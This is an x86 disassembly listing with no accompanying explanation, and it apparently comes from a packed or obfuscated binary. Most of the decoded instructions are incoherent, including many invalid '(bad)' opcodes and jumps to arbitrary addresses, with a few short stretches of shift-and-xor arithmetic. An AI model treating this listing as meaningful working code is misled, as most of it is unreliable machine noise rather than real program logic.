  4055cf:	fisub  WORD PTR [edi+ebx*8]
  4055d2:	pop    ss
  4055d3:	cmp    eax,0xb380493b
  4055d8:	cmp    dh,dh
  4055da:	mov    ah,0xf2
  4055dc:	inc    sp
  4055de:	mov    edi,0xa7a9dcf7
  4055e3:	call   0xbff1:0xbccb855a
  4055ea:	push   ebp
  4055eb:	mov    ds:0xd76a2fb3,eax
  4055f0:	mov    BYTE PTR [esi+0x12],0x59
  4055f4:	mov    DWORD PTR ds:0x9dc706e4,esp
  4055fa:	sub    bl,bl
  4055fc:	or     DWORD PTR [ebx],edi
  4055fe:	test   BYTE PTR [edi-0x20ae76a8],ch
  405604:	sar    BYTE PTR [edi-0x60],1
  405607:	inc    edx
  405608:	or     al,0xeb
  40560a:	aas    
  40560b:	div    BYTE PTR [edx-0x7f2f57d1]
  405611:	mov    ah,0x42
  405613:	or     al,0xff
  405615:	leave  
  405616:	clc    
  405617:	popf   
  405618:	mov    esi,0x98b117b7
  40561d:	inc    ebx
  40561e:	push   edx
  40561f:	in     al,0x55
  405621:	jmp    0x405618
  405623:	jns    0x40565d
  405625:	add    esp,ebp
  405627:	pop    ebx
  405628:	bound  esp,QWORD PTR [esi+0x76d29d6f]
  40562e:	mov    ebp,0xf26e58ec
  405633:	leave  
  405634:	mov    ds:0x38aa6334,al
  405639:	(bad)  
  40563a:	jmp    0xc722:0xcc3407d1
  405641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405642:	retf   
  405643:	ficomp WORD PTR [ecx-0x15]
  405646:	xchg   ebp,eax
  405647:	adc    eax,0xbbd8edc
  40564c:	ins    BYTE PTR es:[edi],dx
  40564d:	and    BYTE PTR [ecx+0x20],bh
  405650:	loopne 0x4055ec
  405652:	div    edx
  405654:	ffreep st(5)
  405656:	js     0x40569e
  405658:	sbb    dl,BYTE PTR [esi-0x1f]
  40565b:	clc    
  40565c:	bound  eax,QWORD PTR [edx-0x76c78c79]
  405662:	xor    ah,BYTE PTR [edi+0x8236f1]
  405668:	pop    ebp
  405669:	retf   0xac88
  40566c:	sub    eax,DWORD PTR [edx]
  40566e:	and    al,BYTE PTR [ebx-0x309b7b0d]
  405674:	push   edi
  405675:	cs xchg ecx,eax
  405677:	cdq    
  405678:	(bad)  
  405679:	sbb    BYTE PTR [edx],cl
  40567b:	scas   eax,DWORD PTR es:[edi]
  40567c:	xor    BYTE PTR [ebx],dh
  40567e:	pop    es
  40567f:	mov    bh,0x55
  405681:	ja     0x4056f4
  405683:	aaa    
  405684:	mov    fs,eax
  405686:	adc    bh,al
  405688:	aad    0xf3
  40568a:	mul    edx
  40568c:	dec    esi
  40568d:	(bad)  
  40568f:	jge    0x4056d8
  405691:	(bad)  
  405692:	jns    0x405614
  405694:	pop    es
  405695:	imul   edi,DWORD PTR [eax+0x69],0x9a7de41a
  40569c:	mov    ds:0x8647585d,al
  4056a1:	scas   eax,DWORD PTR es:[edi]
  4056a2:	or     bl,BYTE PTR [esi-0x11a9e474]
  4056a8:	das    
  4056a9:	ror    ebp,1
  4056ab:	(bad)  
  4056ac:	cmp    BYTE PTR [edx+0x1e],ch
  4056af:	int    0x4d
  4056b1:	push   ebp
  4056b2:	xor    esp,ecx
  4056b4:	hlt    
  4056b5:	bound  edx,QWORD PTR [edx-0x6a]
  4056b8:	mov    bl,0x9c
  4056ba:	dec    eax
  4056bb:	mov    eax,ds:0x9924a93f
  4056c0:	imul   edx,DWORD PTR [esi+0x65700c19],0x1d
  4056c7:	push   edx
  4056c8:	mov    bh,0xb4
  4056ca:	mov    ?,WORD PTR [esi-0x4b42e2dc]
  4056d0:	cli    
  4056d1:	dec    edx
  4056d2:	in     al,dx
  4056d3:	push   edi
  4056d4:	mov    ah,ch
  4056d6:	push   0xffffff87
  4056d8:	test   BYTE PTR [ebp-0x4e78a529],bl
  4056de:	jmp    0x40573c
  4056e0:	les    esi,FWORD PTR [ecx]
  4056e2:	call   0x9343:0xa632
  4056e8:	mov    ch,0x36
  4056ea:	loope  0x405674
  4056ec:	aad    0x4f
  4056ee:	sub    DWORD PTR [ebx],eax
  4056f0:	and    bl,0x51
  4056f3:	xchg   BYTE PTR [eax-0x2b4aea94],bl
  4056f9:	mov    ch,0x39
  4056fb:	mov    eax,0x685bdee7
  405700:	lea    esi,[edx]
  405702:	mov    ebx,0xf3013394
  405707:	(bad)  
  405708:	push   eax
  405709:	cwde   
  40570a:	jnp    0x405786
  40570c:	dec    esi
  40570d:	push   ecx
  40570e:	push   ds
  40570f:	jp     0x405774
  405711:	ds jl  0x4056fb
  405714:	dec    ebp
  405715:	test   al,0x11
  405717:	xchg   DWORD PTR [ebp+0x65394c2e],eax
  40571d:	jge    0x405761
  40571f:	sbb    DWORD PTR [eax],esp
  405721:	and    dl,al
  405723:	fld    QWORD PTR [edx+ebp*8-0x477419d2]
  40572a:	add    ebp,DWORD PTR [ebp+eax*4-0x5b30b4d0]
  405731:	(bad)  
  405732:	or     dh,BYTE PTR [eax+0x3b]
  405735:	ja     0x4056ce
  405737:	jbe    0x405766
  405739:	mov    ecx,0xdf5e2a38
  40573e:	into   
  40573f:	lods   eax,DWORD PTR ds:[esi]
  405740:	popf   
  405741:	pop    ecx
  405742:	cwde   
  405743:	clc    
  405744:	sbb    DWORD PTR [edi-0x194c6bd7],edx
  40574a:	loop   0x4057a1
  40574c:	pop    esp
  40574d:	fstp   st(7)
  40574f:	loop   0x405707
  405751:	pop    ebx
  405752:	and    eax,0x20abdc1
  405757:	cmp    al,0x2b
  405759:	dec    ebx
  40575a:	xor    eax,0xc428ef26
  40575f:	jns    0x405773
  405761:	and    eax,DWORD PTR ss:[ebp-0x72677727]
  405768:	sub    dh,BYTE PTR [edi+0x65]
  40576b:	jl     0x4056f7
  40576d:	xchg   bl,ch
  40576f:	cmc    
  405770:	loope  0x40571f
  405772:	jnp    0x40570a
  405774:	inc    ebx
  405775:	inc    edx
  405776:	imul   edx,DWORD PTR [edi],0xffffffd8
  405779:	mov    esi,0xa12efe3f
  40577e:	(bad)  
  40577f:	out    dx,eax
  405780:	outs   dx,BYTE PTR ds:[esi]
  405781:	in     al,dx
  405782:	push   0xffffff87
  405784:	lock inc ecx
  405786:	in     al,dx
  405787:	or     ah,BYTE PTR [eax+0xda07843]
  40578d:	push   esi
  40578e:	dec    ebp
  40578f:	sub    al,0x18
  405791:	addr16 (bad) 
  405793:	into   
  405794:	dec    edx
  405795:	mov    ebx,0x7f9f637d
  40579a:	mov    al,ds:0xb53681b2
  40579f:	int3   
  4057a0:	xchg   dh,bh
  4057a2:	or     DWORD PTR [eax-0x609e2052],ecx
  4057a8:	lds    eax,FWORD PTR [esi+0x36054b1d]
  4057ae:	into   
  4057af:	gs stc 
  4057b1:	push   0x65
  4057b3:	mov    edx,0xc9c99d0c
  4057b8:	xor    BYTE PTR [esi-0x72],0xa8
  4057bc:	xor    bl,BYTE PTR [edi-0x44]
  4057bf:	pop    edx
  4057c0:	out    dx,eax
  4057c1:	lahf   
  4057c2:	mov    eax,ds:0x1a47e95b
  4057c7:	sbb    bh,BYTE PTR [ebx+esi*2+0x71]
  4057cb:	pop    ebp
  4057cc:	(bad)  
  4057cd:	in     al,0xca
  4057cf:	cmp    eax,0x2e6d5aaf
  4057d4:	ins    DWORD PTR es:[edi],dx
  4057d5:	jo     0x4057d8
  4057d7:	cdq    
  4057d8:	pop    ebp
  4057d9:	stos   BYTE PTR es:[edi],al
  4057da:	adc    edx,DWORD PTR [ecx-0x3b817e5]
  4057e0:	into   
  4057e1:	xor    edi,DWORD PTR [edi+0x51c86f9f]
  4057e7:	into   
  4057e8:	shl    BYTE PTR ds:0x3fb91a4c,1
  4057ee:	pop    ecx
  4057ef:	jle    0x40584c
  4057f1:	jmp    0x405858
  4057f3:	lods   eax,DWORD PTR ds:[esi]
  4057f4:	and    al,BYTE PTR es:[esi]
  4057f7:	mov    edi,0xa4cd7125
  4057fc:	dec    edi
  4057fd:	retf   
  4057fe:	pushf  
  4057ff:	mov    eax,0x43fb769e
  405804:	inc    eax
  405805:	test   eax,0x27c518aa
  40580a:	inc    ecx
  40580b:	les    edx,FWORD PTR [ebp-0x7f]
  40580e:	lahf   
  40580f:	pop    ss
  405810:	mov    ds:0xff0000d9,eax
  405815:	or     DWORD PTR [eax+0x64522b9a],esp
  40581b:	mov    ebx,0x440c78ba
  405820:	xor    bh,ah
  405822:	sub    bh,BYTE PTR [ecx-0x49]
  405825:	stos   DWORD PTR es:[edi],eax
  405826:	es push eax
  405828:	mov    eax,0xb5396d0b
  40582d:	in     al,0xac
  40582f:	arpl   WORD PTR [esi-0x34648cbb],cx
  405835:	jne    0x4057b7
  405837:	jle    0x405807
  405839:	push   0xffffff8b
  40583b:	push   esi
  40583c:	add    al,0xf7
  40583e:	sbb    eax,0x42839b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428187,0x0
  40584d:	mov    DWORD PTR ds:0x428277,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428277,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428187,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e84
  40588d:	adc    DWORD PTR ds:0x42831b,edx
  405893:	or     DWORD PTR ds:0x42824b,0x369f
  40589d:	neg    DWORD PTR ds:0x42818b
  4058a3:	sub    DWORD PTR ds:0x42816b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x40593d
  405910:	hlt    
  405911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405912:	mov    esp,0x1818b16d
  405917:	sahf   
  405918:	adc    bl,BYTE PTR [eax]
  40591a:	sbb    BYTE PTR [ecx],dh
  40591c:	push   0x3c
  40591e:	loope  0x405969
  405920:	xlat   BYTE PTR ds:[ebx]
  405921:	inc    esi
  405922:	adc    BYTE PTR [ebp+0x6ef97972],cl
  405928:	(bad)  
  405929:	mov    ecx,0x986a4c59
  40592e:	xor    dl,BYTE PTR [ebx-0x9ee1ca7]
  405934:	pop    ds
  405935:	jl     0x405969
  405937:	mov    edx,gs
  405939:	scas   al,BYTE PTR es:[edi]
  40593a:	lods   al,BYTE PTR ds:[esi]
  40593b:	mov    ch,0x63
  40593d:	sub    eax,DWORD PTR [ecx+ecx*1+0x6e93a97]
  405944:	jmp    0xe923:0x2d01e269
  40594b:	sysenter 
  40594d:	inc    ecx
  40594e:	xor    eax,0x7aeb3e00
  405953:	ins    DWORD PTR es:[edi],dx
  405954:	scas   al,BYTE PTR es:[edi]
  405955:	mov    edi,DWORD PTR [edx+0x5e]
  405958:	jae    0x405909
  40595a:	hlt    
  40595b:	inc    esi
  40595c:	jb     0x4058ee
  40595e:	bt     DWORD PTR [edx],eax
  405961:	or     al,BYTE PTR [ebp-0x37d6d0be]
  405967:	lods   eax,DWORD PTR ds:[esi]
  405968:	ret    
  405969:	sbb    bh,BYTE PTR [ebx-0x13]
  40596c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40596d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40596e:	test   eax,0x3d94a734
  405973:	les    ebp,FWORD PTR [edx-0x1bf11cc8]
  405979:	xor    eax,0x90fd2e01
  40597e:	jns    0x4059b5
  405980:	mov    eax,0xbf1874aa
  405985:	sbb    ebx,edx
  405987:	mov    al,0x6a
  405989:	imul   edi,DWORD PTR [esi],0x4ed15e72
  40598f:	xchg   DWORD PTR ds:0x227f0df0,ecx
  405995:	jge    0x405986
  405997:	enter  0xf648,0x30
  40599b:	xchg   esp,eax
  40599c:	and    eax,0xba2e9dad
  4059a1:	dec    esp
  4059a2:	js     0x405a0c
  4059a4:	dec    esi
  4059a5:	(bad)  
  4059a6:	mov    al,0x6e
  4059a8:	es data16 stos BYTE PTR es:[edi],al
  4059ab:	rcr    BYTE PTR [edi+0x24],0xbb
  4059af:	xchg   ecx,eax
  4059b0:	sbb    BYTE PTR [edx],dl
  4059b2:	cwde   
  4059b3:	mov    gs,WORD PTR [ecx+0x3e]
  4059b6:	clc    
  4059b7:	jbe    0x4059d5
  4059b9:	xor    eax,0x81602d34
  4059be:	in     eax,dx
  4059bf:	push   edi
  4059c0:	cmp    dl,bl
  4059c2:	fs pop esp
  4059c4:	mov    eax,ds:0x4b724124
  4059c9:	dec    eax
  4059ca:	jno    0x4059d4
  4059cc:	sti    
  4059cd:	sbb    al,BYTE PTR [ebx]
  4059cf:	xchg   esi,eax
  4059d0:	sahf   
  4059d1:	repz push cs
  4059d3:	xchg   esi,eax
  4059d4:	stc    
  4059d5:	jecxz  0x4059a3
  4059d7:	aad    0x18
  4059d9:	sub    esp,DWORD PTR [ecx]
  4059db:	mul    ecx
  4059dd:	(bad)  
  4059de:	xchg   edx,eax
  4059df:	mov    edx,0x4e184e27
  4059e4:	out    0x2,eax
  4059e6:	or     dl,BYTE PTR [ecx-0x70be29fd]
  4059ec:	and    eax,DWORD PTR [esi+0x26]
  4059ef:	mov    eax,ds:0xf20e1e6a
  4059f4:	arpl   WORD PTR [edx-0x678bf3],si
  4059fa:	pop    ebx
  4059fb:	mov    WORD PTR [edi-0x49f55c66],fs
  405a01:	(bad)  
  405a02:	shl    BYTE PTR [ecx-0x282d3850],cl
  405a08:	and    al,0xf4
  405a0a:	sbb    eax,0xbb94b13f
  405a0f:	jno    0x405a8b
  405a11:	mov    al,0x56
  405a13:	xlat   BYTE PTR ds:[ebx]
  405a14:	and    edi,DWORD PTR [ebp-0xd]
  405a17:	mov    ecx,0x44f1d972
  405a1c:	scas   al,BYTE PTR es:[edi]
  405a1d:	jecxz  0x4059a5
  405a1f:	sti    
  405a20:	pop    esi
  405a21:	das    
  405a22:	push   esp
  405a23:	out    dx,eax
  405a24:	cmp    esi,ebx
  405a26:	mov    edx,0x1d3573e9
  405a2b:	xchg   edx,eax
  405a2c:	pop    ds
  405a2d:	add    ecx,DWORD PTR [eax+0x30]
  405a30:	push   bx
  405a32:	cmc    
  405a33:	adc    BYTE PTR [esi-0x39f3265],al
  405a39:	dec    edx
  405a3a:	fcomp  DWORD PTR [ebp-0x44]
  405a3d:	int    0x8
  405a3f:	xchg   esp,eax
  405a40:	ja     0x405a5c
  405a42:	aas    
  405a43:	sub    bh,BYTE PTR [ecx+0x62e06bf6]
  405a49:	lods   al,BYTE PTR ds:[esi]
  405a4a:	cmp    eax,0x5c00a592
  405a4f:	outs   dx,DWORD PTR ds:[esi]
  405a50:	xchg   esi,eax
  405a51:	xchg   esp,eax
  405a52:	enter  0xe579,0x1d
  405a56:	sub    al,0x2e
  405a58:	lock xchg esi,eax
  405a5a:	dec    esp
  405a5b:	or     esi,ebx
  405a5d:	push   esp
  405a5e:	mov    ebx,DWORD PTR [edx]
  405a60:	outs   dx,BYTE PTR ds:[esi]
  405a61:	push   eax
  405a62:	pop    esi
  405a63:	test   eax,0x3eb6491
  405a68:	push   ebp
  405a69:	push   ecx
  405a6a:	sub    eax,0x1bb4b931
  405a6f:	test   DWORD PTR [ecx-0x3f],ebx
  405a72:	add    edi,DWORD PTR [eax+0x45d76f1d]
  405a78:	mov    bl,BYTE PTR [edx+0x52]
  405a7b:	mov    al,0x9
  405a7d:	lock fidiv DWORD PTR [ebp-0x3f]
  405a81:	repnz mov ah,0x86
  405a84:	mov    ds:0xa8cce911,eax
  405a89:	enter  0x1583,0x5c
  405a8d:	adc    eax,0xc65bea03
  405a92:	(bad)  
  405a93:	call   0x832:0x71af21a
  405a9a:	(bad)  
  405a9b:	stos   DWORD PTR es:[edi],eax
  405a9c:	jecxz  0x405a83
  405a9e:	in     eax,dx
  405a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa0:	shl    BYTE PTR [ebp+ecx*1+0x53],cl
  405aa4:	out    dx,al
  405aa5:	xchg   BYTE PTR [edi],cl
  405aa7:	and    BYTE PTR [ecx-0x1ccd7a23],dh
  405aad:	and    dh,BYTE PTR [ebp-0x24]
  405ab0:	leave  
  405ab1:	jnp    0x405b31
  405ab3:	mov    bl,0x86
  405ab5:	ins    BYTE PTR es:[edi],dx
  405ab6:	xchg   ebx,eax
  405ab7:	or     eax,0x44add80b
  405abc:	rcr    BYTE PTR [edi],0xd0
  405abf:	dec    edx
  405ac0:	dec    edx
  405ac1:	mov    ebx,0xf57408b7
  405ac6:	fcom   DWORD PTR [edx+esi*8]
  405ac9:	adc    DWORD PTR [eax],eax
  405acb:	aas    
  405acc:	repnz rcl bh,0x46
  405ad0:	dec    ebx
  405ad1:	inc    ebp
  405ad2:	and    ah,al
  405ad4:	pop    ebp
  405ad5:	mov    bl,0xc7
  405ad7:	jge    0x405aa9
  405ad9:	stos   BYTE PTR es:[edi],al
  405ada:	push   ebp
  405adb:	icebp  
  405adc:	outs   dx,BYTE PTR ds:[esi]
  405add:	int    0xdc
  405adf:	ins    DWORD PTR es:[edi],dx
  405ae0:	pop    edi
  405ae1:	sub    esi,ebp
  405ae3:	mov    bh,0x67
  405ae5:	pop    edx
  405ae6:	xchg   edi,eax
  405ae7:	call   0x2500786b
  405aec:	dec    esp
  405aed:	in     eax,0x25
  405aef:	lds    ebp,FWORD PTR [edx-0x6f]
  405af2:	clc    
  405af3:	mov    ebx,DWORD PTR [ebx-0x6e]
  405af6:	xor    ch,BYTE PTR [eax+0x7a070b0a]
  405afc:	xchg   edi,eax
  405afd:	and    ebp,DWORD PTR [ebx+0x775fe1c8]
  405b03:	fld    TBYTE PTR [ebx+0x58284e25]
  405b09:	not    DWORD PTR [eax]
  405b0b:	fdivp  st(1),st
  405b0d:	retf   
  405b0e:	adc    ah,al
  405b10:	call   0x91d1:0x1679f639
  405b17:	pop    eax
  405b18:	je     0x405b13
  405b1a:	fdiv   DWORD PTR [edi]
  405b1c:	and    eax,0xb5aff19a
  405b21:	mov    ah,0xee
  405b23:	xor    eax,0x68af7499
  405b28:	inc    esi
  405b29:	dec    eax
  405b2a:	dec    esi
  405b2b:	adc    DWORD PTR [edi+0x35],edx
  405b2e:	shr    BYTE PTR [bx+0x3d],0x10
  405b33:	cmp    al,0xe0
  405b35:	div    BYTE PTR [eax]
  405b37:	mov    al,ds:0xdf85c140
  405b3c:	into   
  405b3d:	lods   eax,DWORD PTR ds:[esi]
  405b3e:	jmp    0x284da05b
  405b43:	jmp    0x405ae0
  405b45:	lods   eax,DWORD PTR ds:[esi]
  405b46:	shr    ch,1
  405b48:	sbb    DWORD PTR [esi-0x74017d9],ecx
  405b4e:	dec    edi
  405b4f:	xor    bh,BYTE PTR [esp+ebp*1-0x7a]
  405b53:	stos   BYTE PTR es:[edi],al
  405b54:	sbb    al,0xce
  405b56:	out    dx,eax
  405b57:	fmul   QWORD PTR [eax+0x17c0e516]
  405b5d:	imul   edi,eax,0x87d70fdb
  405b63:	les    edi,FWORD PTR [edx+eax*2+0x30378a10]
  405b6a:	lds    eax,FWORD PTR [ebx+edi*4]
  405b6d:	ins    DWORD PTR es:[edi],dx
  405b6e:	or     ecx,DWORD PTR [edx+0x658b7530]
  405b74:	pop    ebp
  405b75:	add    ebx,edx
  405b77:	test   eax,0xf24e4a67
  405b7c:	ret    0xad90
  405b7f:	aas    
  405b80:	jns    0x405be6
  405b82:	cwde   
  405b83:	mov    bl,0xe2
  405b85:	cmp    DWORD PTR [edi+0x42dbc8c2],esp
  405b8b:	ficomp DWORD PTR [eax-0xe]
  405b8e:	je     0x405c0b
  405b90:	jecxz  0x405be4
  405b92:	pop    eax
  405b93:	(bad)  
  405b94:	sahf   
  405b95:	ret    
  405b96:	mov    dh,0x4
  405b98:	mov    esi,0x6aa6ee63
  405b9d:	clc    
  405b9e:	outs   dx,BYTE PTR ds:[esi]
  405b9f:	mov    dh,0x70
  405ba1:	cmp    bl,BYTE PTR [edx+0x39]
  405ba4:	push   ecx
  405ba5:	adc    al,0xbe
  405ba7:	in     al,0xa5
  405ba9:	popa   
  405baa:	cmp    eax,0xc32858b8
  405baf:	ret    0xcc39
  405bb2:	push   eax
  405bb3:	fcomp  QWORD PTR [ecx-0x23]
  405bb6:	xor    eax,0xcef08a9d
  405bbb:	push   0x2
  405bbd:	sub    eax,0xec1fcd37
  405bc2:	inc    edi
  405bc3:	mov    WORD PTR [ebx+0x68],gs
  405bc6:	mov    bl,0x8b
  405bc8:	lahf   
  405bc9:	jl     0x405c1d
  405bcb:	lahf   
  405bcc:	pop    ebx
  405bcd:	push   edi
  405bce:	push   es
  405bcf:	jecxz  0x405b70
  405bd1:	stc    
  405bd2:	stos   BYTE PTR es:[edi],al
  405bd3:	stos   DWORD PTR es:[edi],eax
  405bd4:	iret   
  405bd5:	aad    0x21
  405bd7:	add    eax,0xae6efde1
  405bdc:	stc    
  405bdd:	stos   DWORD PTR es:[edi],eax
  405bde:	dec    esp
  405bdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405be0:	and    al,0x16
  405be2:	or     DWORD PTR [bx+di+0x8],ecx
  405be6:	mov    edx,0x7a3cb7dd
  405beb:	nop
  405bec:	inc    ebp
  405bed:	cdq    
  405bee:	lahf   
  405bef:	pop    ebx
  405bf0:	or     bh,BYTE PTR [esi+0xc6798fe]
  405bf6:	and    ebp,DWORD PTR [edx-0x19e74e76]
  405bfc:	mov    edi,cs
  405bfe:	xor    DWORD PTR [ebx-0x60],0xa
  405c02:	not    DWORD PTR [edi+0x61]
  405c05:	pop    ebx
  405c06:	enter  0x358f,0x78
  405c0a:	xchg   edx,eax
  405c0b:	ret    
  405c0c:	cmp    eax,0xc90e0ab6
  405c11:	and    al,0x30
  405c13:	cmp    ah,dh
  405c15:	sti    
  405c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c17:	xchg   esi,eax
  405c18:	adc    BYTE PTR [ebx-0x14d5c8ef],ah
  405c1e:	(bad)  
  405c1f:	xor    al,0x40
  405c21:	frstor [edi]
  405c24:	sbb    al,0xe1
  405c26:	add    eax,0xbd53febf
  405c2b:	push   edx
  405c2c:	or     al,0x3e
  405c2e:	mov    ecx,0x9c16d22d
  405c33:	je     0x405c1e
  405c35:	shl    BYTE PTR [esi+edx*1+0x5a],0x77
  405c3a:	arpl   WORD PTR ds:0x8b56be18,cx
  405c40:	aaa    
  405c41:	or     BYTE PTR [ecx+edi*2-0x23],ah
  405c45:	xor    ch,BYTE PTR [eax+0x33]
  405c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c49:	jle    0x405c53
  405c4b:	inc    ecx
  405c4c:	add    BYTE PTR [ebx],cl
  405c4e:	jge    0x405c01
  405c50:	xchg   esp,eax
  405c51:	pusha  
  405c52:	and    eax,0xcd53a3e1
  405c57:	fs mov edx,0x61e1458
  405c5d:	or     eax,0x7d485eb7
  405c62:	fst    QWORD PTR [edx]
  405c64:	mov    ecx,0x2f575faa
  405c69:	pop    ss
  405c6a:	inc    edi
  405c6b:	mov    ebp,DWORD PTR [ebx-0x30]
  405c6e:	cwde   
  405c6f:	jmp    0xc5f7:0x68ced1f7
  405c76:	stos   DWORD PTR es:[edi],eax
  405c77:	into   
  405c78:	dec    ebx
  405c79:	into   
  405c7a:	or     al,0xd3
  405c7c:	and    bh,dl
  405c7e:	sahf   
  405c7f:	xchg   DWORD PTR [esi],edx
  405c81:	iret   
  405c82:	mov    ebx,0x99615af2
  405c87:	jbe    0x405cc6
  405c89:	xor    cl,BYTE PTR [eax]
  405c8b:	mov    cl,0x64
  405c8e:	jmp    0x405c4c
  405c90:	ins    DWORD PTR es:[edi],dx
  405c91:	loopne 0x405c6e
  405c93:	sti    
  405c94:	aas    
  405c95:	dec    esp
  405c96:	cli    
  405c97:	xchg   DWORD PTR [ebx+0x1a],edi
  405c9a:	and    eax,DWORD PTR [edi-0x2ad457d6]
  405ca0:	cwde   
  405ca1:	int    0x5b
  405ca3:	cld    
  405ca4:	add    BYTE PTR [edi],ch
  405ca6:	repnz mov edx,0x41279abd
  405cac:	dec    esi
  405cad:	test   BYTE PTR [edx],ah
  405caf:	sub    eax,0x579e5588
  405cb4:	ret    0x2cb4
  405cb7:	lea    esi,[ecx+0x2d8729e9]
  405cbd:	xor    DWORD PTR [ebp-0x75af5873],edx
  405cc3:	mov    edi,0x39300136
  405cc8:	inc    edi
  405cc9:	xor    eax,0x29c42a72
  405cce:	push   0xffffffcc
  405cd0:	xor    dl,BYTE PTR cs:[ebp+0x5583d30e]
  405cd7:	mov    ecx,ebx
  405cd9:	aas    
  405cda:	xchg   edi,eax
  405cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cdc:	mov    DWORD PTR [ebp-0x2c],eax
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0x2e],1
  405d2b:	inc    eax
  405d2c:	jge    0x405cde
  405d2e:	repnz test eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	sub    DWORD PTR [edi+0x13dd2f9f],edi
  405d3c:	mov    edx,0xe4114fd8
  405d41:	imul   BYTE PTR [edi-0xc]
  405d44:	dec    BYTE PTR [ebx]
  405d46:	clc    
  405d47:	mul    BYTE PTR [edi]
  405d49:	ss jge 0x405d8d
  405d4c:	push   edi
  405d4d:	mov    edx,0x4850a3d
  405d52:	retf   0x6604
  405d55:	mov    al,0xa0
  405d57:	xchg   esp,eax
  405d58:	add    BYTE PTR [esi],0xd5
  405d5b:	mov    ?,WORD PTR [edi]
  405d5d:	sbb    edx,ecx
  405d5f:	jnp    0x405ddf
  405d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d62:	cmp    al,0x3d
  405d64:	fdivr  QWORD PTR [ecx]
  405d66:	fsub   QWORD PTR [eax-0x45]
  405d69:	ja     0x405d28
  405d6b:	(bad)  
  405d6d:	fs (bad) 
  405d6f:	jne    0x405d1a
  405d71:	in     eax,dx
  405d72:	mov    dh,0xa2
  405d74:	and    dh,BYTE PTR [edx-0x3049192c]
  405d7a:	imul   esi,ebx,0xd93a5e07
  405d80:	xor    BYTE PTR [ebx],bh
  405d82:	jno    0x405d4d
  405d84:	add    ecx,edi
  405d86:	imul   esp,DWORD PTR [ebx],0x6f0a7f44
  405d8c:	sub    ah,ah
  405d8e:	call   0xf29c83fd
  405d93:	in     al,dx
  405d94:	div    BYTE PTR [ecx+0x1fe9aee3]
  405d9a:	xor    eax,0x9bb16724
  405d9f:	mov    al,0xf4
  405da1:	sub    BYTE PTR [edi+0x9],bh
  405da4:	sub    ebx,DWORD PTR [esi-0x226e30c3]
  405daa:	adc    ebp,DWORD PTR [ebp+eiz*2+0x78]
  405dae:	icebp  
  405daf:	or     DWORD PTR [ebx],ebx
  405db1:	pop    ss
  405db2:	daa    
  405db3:	cdq    
  405db4:	repz pop esi
  405db6:	dec    edx
  405db7:	push   0x6313e0cb
  405dbc:	pop    eax
  405dbd:	fmul   DWORD PTR [esi-0x27]
  405dc1:	(bad)  
  405dc2:	pop    ebx
  405dc3:	loopne 0x405d62
  405dc5:	addr16 std 
  405dc7:	ins    DWORD PTR es:[edi],dx
  405dc8:	test   DWORD PTR [edi],0xdf534cfc
  405dce:	data16 jnp 0x405e06
